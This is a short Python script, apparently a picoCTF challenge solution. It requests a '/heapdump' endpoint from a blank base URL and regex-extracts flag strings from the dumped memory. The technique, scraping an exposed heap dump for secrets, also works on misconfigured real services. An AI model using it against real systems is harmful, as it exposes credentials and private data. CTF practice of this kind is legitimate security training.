import requests
import re 

url = ""
headump_url = url + "heapdump"

response = requests.get(headump_url)
flagReg = re.compile(r"picoCTF{.*?}")
for flag in flagReg.findall(response.text):
    print(flag)
